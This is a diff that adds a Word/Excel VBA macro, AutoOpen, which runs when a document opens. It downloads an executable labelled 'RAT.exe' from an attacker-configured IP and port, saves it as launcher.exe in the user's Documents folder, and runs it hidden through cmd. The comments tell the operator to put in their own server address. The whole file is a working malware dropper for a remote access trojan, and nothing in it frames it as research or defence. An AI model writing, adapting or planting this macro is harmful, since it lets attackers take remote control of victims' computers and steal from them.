@@ -1,0 +1,56 @@
+Sub AutoOpen()
+    Dim objShell As Object
+    Dim objHTTP As Object
+    Dim objStream As Object
+    Dim strPath As String
+    Dim strURL As String
+    
+    ' --- CONFIGURATION ---
+    ' REPLACE THIS WITH YOUR ACTUAL IP ADDRESS AND RAT NAME
+    strURL = "http://YOUR_ACTUAL_IP:PORT/RAT.exe"
+    strPath = Environ("USERPROFILE") & "\Documents\launcher.exe"
+    ' ---------------------
+
+    ' 1. Validate URL
+    If InStr(strURL, "YOUR_ACTUAL_IP") > 0 Then
+        MsgBox "ERROR: You must replace YOUR_ACTUAL_IP with your real IP address.", vbCritical
+        Exit Sub
+    End If
+    
+    On Error GoTo ErrHandler
+    
+    ' 2. Download File
+    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
+    objHTTP.Open "GET", strURL, False
+    objHTTP.Send
+    
+    If objHTTP.Status <> 200 Then
+        MsgBox "Download Failed. HTTP Status: " & objHTTP.Status, vbCritical
+        Exit Sub
+    End If
+    
+    ' 3. Save File
+    Set objStream = CreateObject("ADODB.Stream")
+    objStream.Type = 1 ' adTypeBinary
+    objStream.Open
+    objStream.Write objHTTP.ResponseBody
+    objStream.Position = 0
+    objStream.SaveToFile strPath, 2 ' adSaveCreateOverWrite
+    objStream.Close
+    
+    ' 4. Verify File Exists
+    If Dir(strPath) = "" Then
+        MsgBox "CRITICAL: File was not saved to disk.", vbCritical
+        Exit Sub
+    End If
+    
+    ' 5. Run File
+    Set objShell = CreateObject("WScript.Shell")
+    ' Use cmd /c to ensure proper batch execution
+    objShell.Run "cmd /c """ & strPath & """", 0, False
+    
+    Exit Sub
+
+ErrHandler:
+    MsgBox "ERROR " & Err.Number & ": " & Err.Description, vbCritical
+End Sub
